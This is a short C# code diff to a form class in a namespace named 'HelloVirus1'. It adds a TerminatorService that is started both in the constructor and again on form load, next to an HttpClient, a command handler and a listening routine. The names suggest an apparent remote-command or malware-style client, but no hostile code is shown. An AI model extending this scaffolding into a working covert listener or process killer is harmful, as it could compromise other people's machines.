@@ -12,16 +12,20 @@ namespace HelloVirus1
         private HttpClient client;
         private CommandHandler handler;
         private Config config;
+        private TerminatorService terminator;
 
         public MainForm()
         {
             InitializeComponent();
             client = new HttpClient();
             config = new Config();
+            terminator = new TerminatorService();
+            terminator.start();
         }
 
         private async void MainForm_Load(object sender, EventArgs e)
         {
+            terminator.start();
             await StartListening();
         }
 
